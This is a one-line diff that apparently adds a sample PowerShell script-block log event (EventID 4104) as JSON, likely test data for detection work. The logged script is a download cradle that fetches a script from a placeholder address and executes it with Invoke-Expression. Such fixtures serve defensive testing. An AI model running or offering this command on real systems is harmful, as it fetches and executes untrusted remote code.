@@ -1,0 +1,1 @@
+{"EventID": 4104, "ScriptBlockText": "$wc = New-Object Net.WebClient; Invoke-Expression ($wc.DownloadString('http://192.0.2.7/a.ps1'))", "Path": ""}
